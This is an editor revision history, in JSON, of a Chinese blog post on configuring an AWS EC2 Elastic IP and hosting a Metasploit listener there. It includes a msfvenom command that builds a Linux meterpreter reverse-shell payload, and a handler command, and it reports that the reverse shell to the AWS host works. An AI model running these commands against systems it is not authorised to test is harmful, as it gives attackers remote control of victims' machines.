{"compress":true,"commitItems":[["e618df09-206e-4241-9043-c50ec95470b1",1568294519432,"",[[1568294468651,["whale@Whale",[[1,0,"aws\n===\n\n\n"]],[0,0],[10,10]]],[1568294478655,["whale@Whale",[[-1,0,"aws"],[1,3,"# AWS亚马逊云服务器搭建与使用"]],[0,3],[17,17]]],[1568294482140,["whale@Whale",[[-1,18,"==="]],[21,21],[18,18]]],[1568294482560,["whale@Whale",[[-1,20,"\n"]],[18,18],[17,17]]],[1568294483478,["whale@Whale",[[1,17,"()"]],[17,17],[19,19]]],[1568294484376,["whale@Whale",[[-1,17,"()"]],[19,19],[17,17]]],[1568294485166,["whale@Whale",[[1,17,"（）"]],[17,17],[19,19]]],[1568294487415,["whale@Whale",[[1,18,"二"]],[18,18],[19,19]]],[1568294490278,["whale@Whale",[[1,23,"\n"]],[21,21],[22,22]]],[1568294510521,["whale@Whale",[[1,22,"上一篇：[https://whale3070.github.io/tools/2019/08/31/10-x/](https://whale3070.github.io/tools/2019/08/31/10-x/)"]],[22,22],[130,130]]],[1568294526789,["whale@Whale",[[-1,27,"https://whale3070.github.io/tools/2019/08/31/10-x/"],[1,77,"# AWS亚马逊云服务器搭建与使用"]],[27,77],[44,44]]],[1568294530745,["whale@Whale",[[-1,27,"# "]],[29,29],[27,27]]],[1568294534191,["whale@Whale",[[-1,12,"搭建与"]],[15,15],[12,12]]],[1568294537942,["whale@Whale",[[1,94,"\n"]],[93,93],[94,94]]],[1568294620519,["whale@Whale",[[1,95,"![1]($res/1.PNG)\n\n"]],[94,94],[112,112]]],[1568294627884,["whale@Whale",[[1,94,"ifconfig，"]],[94,94],[103,103]]],[1568294628468,["whale@Whale",[[-1,102,"，"]],[103,103],[102,102]]],[1568294630375,["whale@Whale",[[1,102,"`"]],[102,102],[103,103]]],[1568294632199,["whale@Whale",[[1,94,"`"]],[94,94],[95,95]]],[1568294634508,["whale@Whale",[[1,104,","]],[104,104],[105,105]]],[1568294635675,["whale@Whale",[[-1,104,","]],[105,105],[104,104]]],[1568294636261,["whale@Whale",[[1,104,"，"]],[104,104],[105,105]]],[1568294678033,["whale@Whale",[[1,105,"只有两个网卡，一个内网网卡、一个本地环回地址。"]],[105,105],[128,128]]],[1568294681200,["whale@Whale",[[-1,116,"网卡"]],[118,118],[116,116]]],[1568294682233,["whale@Whale",[[1,116,"地址"]],[116,116],[118,118]]],[1568294700328,["whale@Whale",[[1,128,"没有外网IP，为了"]],[128,128],[137,137]]],[1568294709786,["whale@Whale",[[1,137,"方便以后使用，我们要绑定一个。"]],[137,137],[152,152]]],[1568294711683,["whale@Whale",[[1,153,"\n"]],[152,152],[153,153]]],[1568294938057,["whale@Whale",[[1,172,"![2]($res/2.PNG)\n\n"]],[171,171],[189,189]]],[1568295020180,["whale@Whale",[[1,190,"![3]($res/3.PNG)\n\n"]],[189,189],[207,207]]],[1568295035607,["whale@Whale",[[1,172,"\n"]],[171,171],[172,172]]],[1568295038816,["whale@Whale",[[1,172,"第一步："]],[172,172],[176,176]]],[1568295040590,["whale@Whale",[[1,195,"\n"]],[194,194],[195,195]]],[1568295042548,["whale@Whale",[[-1,195,"\n"]],[195,195],[194,194]]],[1568299181883,["whale@Whale",[[1,213,"![5]($res/5.PNG)\n\n"]],[212,212],[230,230]]],[1568300617633,["whale@Whale",[[1,231,"![6]($res/6.PNG)\n\n"]],[230,230],[248,248]]]]],["ee47ed16-21fe-4232-a4d6-afa8ff66f18f",1568342281680,"# AWS亚马逊云服务器使用（二）\n\n上一篇：[AWS亚马逊云服务器搭建与使用](https://whale3070.github.io/tools/2019/08/31/10-x/)\n\n`ifconfig`，只有两个网卡，一个内网地址、一个本地环回地址。没有外网IP，为了方便以后使用，我们要绑定一个。\n\n![1]($res/1.PNG)\n\n第一步：\n![2]($res/2.PNG)\n\n![3]($res/3.PNG)\n\n![5]($res/5.PNG)\n\n![6]($res/6.PNG)\n\n",[[1568342241480,["whale@Whale",[[1,248,"msf绑定外网ip失败"]],[248,248],[259,259]]],[1568342251750,["whale@Whale",[[1,248,"\n"]],[247,247],[248,248]]],[1568342256651,["whale@Whale",[[1,249,"## "]],[249,249],[252,252]]],[1568342262123,["whale@Whale",[[1,264,"\n"]],[263,263],[264,264]]],[1568342277292,["whale@Whale",[[1,264,"msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=18.189.10.86 LPORT=6678 -f elf -o payload.elf"]],[264,264],[361,361]]],[1568342285045,["whale@Whale",[[-1,316,"18.189.10.86"],[1,328,"w"]],[316,328],[316,317]]],[1568342286200,["whale@Whale",[[1,317,"a"]],[316,317],[316,318]]],[1568342286359,["whale@Whale",[[1,318,"i"]],[316,318],[316,319]]],[1568342287063,["whale@Whale",[[1,319,"'w"]],[316,319],[316,321]]],[1568342287537,["whale@Whale",[[-1,316,"wai'w"],[1,321,"外网"]],[316,321],[316,318]]],[1568342288880,["whale@Whale",[[1,318,"IP"]],[318,318],[320,320]]],[1568342293361,["whale@Whale",[[1,264,"\n"]],[263,263],[264,264]]],[1568342294100,["whale@Whale",[[1,265,"\n"]],[264,264],[265,265]]],[1568342296888,["whale@Whale",[[1,265,"···"]],[265,265],[268,268]]],[1568342298031,["whale@Whale",[[-1,265,"···"]],[268,268],[265,265]]],[1568342299025,["whale@Whale",[[1,265,"```"]],[265,265],[268,268]]],[1568342301324,["whale@Whale",[[1,359,"\n"]],[358,358],[359,359]]],[1568342302151,["whale@Whale",[[-1,359,"\n"],[1,360,"```"]],[359,359],[362,362]]],[1568342308226,["whale@Whale",[[1,321,"mu"]],[321,321],[323,323]]],[1568342309008,["whale@Whale",[[-1,321,"mu"]],[323,323],[321,321]]],[1568342312823,["whale@Whale",[[1,321,"目标机器"]],[321,321],[325,325]]],[1568342344905,["whale@Whale",[[1,265,"\n"]],[264,264],[265,265]]],[1568342355464,["whale@Whale",[[1,265,"目标机器执行payload.ef"]],[265,265],[281,281]]],[1568342356085,["whale@Whale",[[-1,280,"f"]],[281,281],[280,280]]],[1568342356411,["whale@Whale",[[1,280,"if"]],[280,280],[282,282]]],[1568342357833,["whale@Whale",[[-1,280,"if"]],[282,282],[280,280]]],[1568342358320,["whale@Whale",[[1,280,"lf"]],[280,280],[282,282]]],[1568342360991,["whale@Whale",[[1,265,"\n"]],[264,264],[265,265]]],[1568342373638,["whale@Whale",[[1,265,"da"]],[265,265],[267,267]]],[1568342374243,["whale@Whale",[[-1,265,"da"]],[267,267],[265,265]]],[1568342375994,["whale@Whale",[[1,265,"打耳光"]],[265,265],[268,268]]],[1568342377035,["whale@Whale",[[-1,265,"打耳光"]],[268,268],[265,265]]],[1568342400486,["whale@Whale",[[1,265,"当在aws上部署msf的时候，监听外网IP，却提示"]],[265,265],[290,290]]],[1568342475610,["whale@Whale",[[1,291,"\n"]],[290,290],[291,291]]],[1568342475885,["whale@Whale",[[1,292,"\n"]],[291,291],[292,292]]],[1568342483270,["whale@Whale",[[1,292,"![7]($res/7.PNG)\n\n"]],[291,291],[309,309]]],[1568342510880,["whale@Whale",[[1,290,"Handler failed to bind to 本地外网IP"]],[290,290],[322,322]]],[1568342517500,["whale@Whale",[[1,290,"·"]],[290,290],[291,291]]],[1568342519036,["whale@Whale",[[-1,290,"·"]],[291,291],[290,290]]],[1568342519546,["whale@Whale",[[1,290,"`"]],[290,290],[291,291]]],[1568342521118,["whale@Whale",[[1,323,"`"]],[323,323],[324,324]]],[1568344000459,["whale@Whale",[[-1,344,"\n"]],[344,344],[343,343]]],[1568344008000,["whale@Whale",[[1,94,"\n"]],[93,93],[94,94]]],[1568344010833,["whale@Whale",[[1,94,"# b"]],[94,94],[97,97]]],[1568344011571,["whale@Whale",[[-1,96,"b"]],[97,97],[96,96]]],[1568344017064,["whale@Whale",[[1,96,"绑定弹性IP"]],[96,96],[102,102]]],[1568344018889,["whale@Whale",[[1,103,"\n"]],[102,102],[103,103]]],[1568344019190,["whale@Whale",[[1,104,"\n"]],[103,103],[104,104]]],[1568344021592,["whale@Whale",[[1,104,"awsm"]],[104,104],[108,108]]],[1568344022211,["whale@Whale",[[-1,107,"m"]],[108,108],[107,107]]],[1568344042993,["whale@Whale",[[1,107,"每次重启实例，ip都会改变，所以为了固定IP，"]],[107,107],[130,130]]],[1568344057633,["whale@Whale",[[-1,109,"重启实例"]],[113,113],[109,109]]],[1568344060174,["whale@Whale",[[1,109,"关机"]],[109,109],[111,111]]],[1568344063784,["whale@Whale",[[-1,109,"关机"]],[111,111],[109,109]]],[1568344072273,["whale@Whale",[[1,107," EC2"]],[107,107],[111,111]]],[1568344109450,["whale@Whale",[[1,104,"\n"]],[103,103],[104,104]]],[1568344109919,["whale@Whale",[[1,104,"ca"]],[104,104],[106,106]]],[1568344110504,["whale@Whale",[[-1,104,"ca"]],[106,106],[104,104]]],[1568344116920,["whale@Whale",[[1,104,"参考资料：[https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/elastic-ip-addresses-eip.html](https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/elastic-ip-addresses-eip.html)‘"]],[104,104],[288,288]]],[1568344118082,["whale@Whale",[[-1,287,"‘"]],[288,288],[287,287]]],[1568344118341,["whale@Whale",[[1,288,"\n"]],[287,287],[288,288]]],[1568344184201,["whale@Whale",[[-1,289,"aws EC2每次，ip都会改变，所以为了固定IP，"]],[289,315],[289,289]]],[1568344184494,["whale@Whale",[[-1,289,"\n"]],[289,289],[288,288]]],[1568344264808,["whale@Whale",[[1,349,"\n"]],[348,348],[349,349]]],[1568344265493,["whale@Whale",[[1,349,"服务器外网IP与内网IP之间是通过一对一的NAT实现的，内网Ip配置在网卡上，外网Ip配置在网关上。如有需要绑定IP的场景，直接绑定内网IP即可，可以转发到外网IP上"]],[349,349],[432,432]]],[1568344272223,["whale@Whale",[[1,349,"云"]],[349,349],[350,350]]],[1568344272525,["whale@Whale",[[-1,349,"云"]],[350,350],[349,349]]],[1568344275834,["whale@Whale",[[1,349,"亚马逊云"]],[349,349],[353,353]]],[1568344283017,["whale@Whale",[[1,437,"\n"]],[437,437],[438,438]]],[1568344814321,["whale@Whale",[[1,289,"\n"]],[288,288],[289,289]]],[1568344824635,["whale@Whale",[[1,289,"弹性IP是aws的一个特性"]],[289,289],[302,302]]],[1568344827812,["whale@Whale",[[1,289,"·"]],[289,289],[290,290]]],[1568344828651,["whale@Whale",[[-1,289,"·"]],[290,290],[289,289]]],[1568344829026,["whale@Whale",[[1,289,"`"]],[289,289],[290,290]]],[1568344830386,["whale@Whale",[[1,294,"`"]],[294,294],[295,295]]],[1568344845284,["whale@Whale",[[1,304,"，它可以分配给多个"]],[304,304],[313,313]]],[1568344852981,["whale@Whale",[[-1,310,"给多个"]],[313,313],[310,310]]],[1568344860816,["whale@Whale",[[1,310,"给A实例，当A"]],[310,310],[317,317]]],[1568344864315,["whale@Whale",[[-1,315,"当A"]],[317,317],[315,315]]],[1568344879320,["whale@Whale",[[1,315,"当你不想要A实例的时候，还可以"]],[315,315],[330,330]]],[1568344880543,["whale@Whale",[[-1,327,"还可以"]],[330,330],[327,327]]],[1568344882855,["whale@Whale",[[1,327,"然后"]],[327,327],[329,329]]],[1568344883976,["whale@Whale",[[-1,327,"然后"]],[329,329],[327,327]]],[1568344892280,["whale@Whale",[[1,327,"又可以分配给B实例。"]],[327,327],[337,337]]],[1568344893431,["whale@Whale",[[1,338,"\n"]],[337,337],[338,338]]],[1568344906258,["whale@Whale",[[1,337,"于是"]],[337,337],[339,339]]],[1568344907762,["whale@Whale",[[-1,337,"于是"]],[339,339],[337,337]]],[1568344916275,["whale@Whale",[[1,337,"于是IP是不变的，但是"]],[337,337],[348,348]]],[1568344922623,["whale@Whale",[[1,348,"机器"]],[348,348],[350,350]]],[1568344926936,["whale@Whale",[[-1,348,"机器"]],[350,350],[348,348]]],[1568344928586,["whale@Whale",[[1,348,"IPdai"]],[348,348],[353,353]]],[1568344929366,["whale@Whale",[[-1,350,"dai"]],[353,353],[350,350]]],[1568344938388,["whale@Whale",[[1,350,"代表的机器"]],[350,350],[355,355]]],[1568344940939,["whale@Whale",[[-1,350,"代表的机器"]],[355,355],[350,350]]],[1568344971755,["whale@Whale",[[1,350,"对应的机器却变了。这样比较方便，使用者完全感受不到底层的编号"]],[350,350],[380,380]]],[1568344972373,["whale@Whale",[[-1,378,"编号"]],[380,380],[378,378]]],[1568344974483,["whale@Whale",[[1,378,"变化。"]],[378,378],[381,381]]],[1568345098397,["whale@Whale",[[1,383,"\n"]],[382,382],[383,383]]],[1568345100476,["whale@Whale",[[1,383,"当我们"]],[383,383],[386,386]]],[1568345115808,["whale@Whale",[[1,386,"把弹性IP和实例关联以后，"]],[386,386],[399,399]]],[1568345124879,["whale@Whale",[[1,387,"·"]],[387,387],[388,388]]],[1568345126808,["whale@Whale",[[-1,387,"·"]],[388,388],[387,387]]],[1568345127445,["whale@Whale",[[1,387,"`"]],[387,387],[388,388]]],[1568345128901,["whale@Whale",[[1,392,"`"]],[392,392],[393,393]]],[1568345130154,["whale@Whale",[[1,394,"`"]],[394,394],[395,395]]],[1568345130976,["whale@Whale",[[1,397,"`"]],[397,397],[398,398]]],[1568345133308,["whale@Whale",[[1,403,"jiu"]],[403,403],[406,406]]],[1568345134020,["whale@Whale",[[-1,403,"jiu"]],[406,406],[403,403]]],[1568345136101,["whale@Whale",[[1,403,"就不要"]],[403,403],[406,406]]],[1568345137196,["whale@Whale",[[-1,403,"就不要"]],[406,406],[403,403]]],[1568345143384,["whale@Whale",[[1,403,"就不用关心"]],[403,403],[408,408]]],[1568345179025,["whale@Whale",[[-1,406,"关心"]],[408,408],[406,406]]],[1568345187944,["whale@Whale",[[1,406,"担心IP会变化了。"]],[406,406],[415,415]]],[1568345188819,["whale@Whale",[[1,416,"\n"]],[415,415],[416,416]]],[1568345206118,["whale@Whale",[[1,415,"如果不使用\t"]],[415,415],[421,421]]],[1568345206835,["whale@Whale",[[-1,420,"\t"]],[421,421],[420,420]]],[1568345207574,["whale@Whale",[[1,420,"``"]],[420,420],[422,422]]],[1568345211110,["whale@Whale",[[1,421,"弹性IP"]],[421,421],[425,425]]],[1568345212211,["whale@Whale",[[1,426,","]],[426,426],[427,427]]],[1568345212973,["whale@Whale",[[-1,426,","]],[427,427],[426,426]]],[1568345221714,["whale@Whale",[[1,426,"，实例重启后，分配的IP可能"]],[426,426],[440,440]]],[1568345224043,["whale@Whale",[[1,440,"会改变。"]],[440,440],[444,444]]],[1568345227700,["whale@Whale",[[1,446,"\n"]],[445,445],[446,446]]],[1568345228764,["whale@Whale",[[1,446,"---"]],[446,446],[449,449]]],[1568345245976,["whale@Whale",[[1,95,"@"]],[95,95],[96,96]]],[1568345247537,["whale@Whale",[[-1,95,"@"]],[96,96],[95,95]]],[1568345247937,["whale@Whale",[[1,95,"#"]],[95,95],[96,96]]],[1568346266050,["whale@Whale",[[-1,491,"，为了方便以后使用，我们要绑定一个。"]],[491,509],[491,491]]],[1568346266523,["whale@Whale",[[1,491,"。"]],[491,491],[492,492]]],[1568346325553,["whale@Whale",[[1,773,"\n"]],[772,772],[773,773]]],[1568346336112,["whale@Whale",[[1,773,"于是测试一下，msf监听"]],[773,773],[785,785]]],[1568346390197,["whale@Whale",[[1,786,"\n"]],[785,785],[786,786]]],[1568346403548,["whale@Whale",[[1,785,"，"]],[785,785],[786,786]]],[1568346406176,["whale@Whale",[[-1,785,"，"]],[786,786],[785,785]]],[1568346417528,["whale@Whale",[[1,785,"，反弹shell是否能反弹成功。"]],[785,785],[801,801]]],[1568346422664,["whale@Whale",[[1,922,"\n\n"]],[922,922],[923,923]]],[1568346423076,["whale@Whale",[[1,924,"\n"]],[923,923],[924,924]]],[1568346495714,["whale@Whale",[[1,807,"："]],[807,807],[808,808]]],[1568346501435,["whale@Whale",[[1,920,"\n"]],[919,919],[920,920]]],[1568346501696,["whale@Whale",[[1,921,"\n"]],[920,920],[921,921]]],[1568346502424,["whale@Whale",[[1,921,"。"]],[921,921],[922,922]]],[1568346503042,["whale@Whale",[[-1,921,"。"]],[922,922],[921,921]]],[1568346507980,["whale@Whale",[[1,921,"./payload.elf"]],[921,921],[934,934]]],[1568346524404,["whale@Whale",[[1,939,"aws监听："]],[939,939],[945,945]]],[1568346524646,["whale@Whale",[[1,947,"\n"]],[945,945],[946,946]]],[1568346539915,["whale@Whale",[[1,947,"handler -H 18.189.10.86 -P 6678 -p linux/x86/meterpreter/reverse_tcp"]],[947,947],[1015,1015]]],[1568346547362,["whale@Whale",[[-1,803,"目标机器：执行payload.elf\n```\nmsfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=目标机器外网IP LPORT=6678 -f elf -o payload.elf\n\n./payload.elf\n```\n"]],[802,938],[802,802]]],[1568346549632,["whale@Whale",[[1,880,"\n"]],[879,879],[880,880]]],[1568346550315,["whale@Whale",[[1,881,"\n"]],[880,880],[881,881]]],[1568346550977,["whale@Whale",[[1,882,"目标机器：执行payload.elf\n```\nmsfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=目标机器外网IP LPORT=6678 -f elf -o payload.elf\n\n./payload.elf\n```\n"]],[881,881],[1017,1017]]],[1568346558994,["whale@Whale",[[1,810,"```"]],[810,810],[813,813]]],[1568346560007,["whale@Whale",[[1,883,"```"]],[883,883],[886,886]]],[1568346561517,["whale@Whale",[[1,810,"\n"]],[809,809],[810,810]]],[1568346563523,["whale@Whale",[[-1,888,"\n"]],[888,888],[887,887]]],[1568346577697,["whale@Whale",[[1,1024,"\n"]],[1023,1023],[1024,1024]]],[1568346578921,["whale@Whale",[[-1,1024,"\n"],[1,1025,"qu"]],[1024,1024],[1026,1026]]],[1568346579338,["whale@Whale",[[-1,1025,"u"]],[1026,1026],[1025,1025]]],[1568346579527,["whale@Whale",[[-1,1024,"q"],[1,1025,"\n"]],[1025,1025],[1024,1024]]],[1568346590341,["whale@Whale",[[-1,1024,"\n"],[1,1025,"aws确实是可以反弹成功的。"]],[1024,1024],[1038,1038]]],[1568346590909,["whale@Whale",[[1,1038,"\n\n"]],[1038,1038],[1039,1039]]],[1568346591119,["whale@Whale",[[1,1040,"\n"]],[1039,1039],[1040,1040]]],[1568346650768,["whale@Whale",[[-1,826,"18.189.10.86"],[1,838,"a"]],[826,838],[826,827]]],[1568346651004,["whale@Whale",[[1,827,"'w"]],[826,827],[826,829]]],[1568346651416,["whale@Whale",[[1,829,"'s"]],[826,829],[826,831]]],[1568346651835,["whale@Whale",[[-1,827,"'"],[-1,829,"'"]],[826,831],[826,829]]],[1568346653476,["whale@Whale",[[1,829,"外面"]],[829,829],[831,831]]],[1568346654119,["whale@Whale",[[-1,829,"外面"]],[831,831],[829,829]]],[1568346656854,["whale@Whale",[[1,829,"外网IP"]],[829,829],[833,833]]],[1568346674746,["whale@Whale",[[-1,958,"目标机器外网IP"]],[958,966],[958,958]]],[1568346678216,["whale@Whale",[[1,958,"aws外网IP"]],[958,958],[965,965]]],[1568346704658,["whale@Whale",[[1,1035,"![7]($res/7.PNG)\n\n"]],[1034,1034],[1052,1052]]],[1568346708434,["whale@Whale",[[1,1034,"su"]],[1034,1034],[1036,1036]]],[1568346709039,["whale@Whale",[[-1,1034,"su"]],[1036,1036],[1034,1034]]],[1568346721480,["whale@Whale",[[1,1034,"所以handler绑定失败是正常的，只要"]],[1034,1034],[1054,1054]]],[1568346730260,["whale@Whale",[[-1,1052,"只要"]],[1054,1054],[1052,1052]]],[1568346759095,["whale@Whale",[[1,1052,"提示在-"]],[1052,1052],[1056,1056]]],[1568346759618,["whale@Whale",[[-1,1055,"-"]],[1056,1056],[1055,1055]]],[1568346779438,["whale@Whale",[[1,1055,"0.0.0.0监听，意思是监听所有网卡的该端口。"]],[1055,1055],[1079,1079]]]]]]}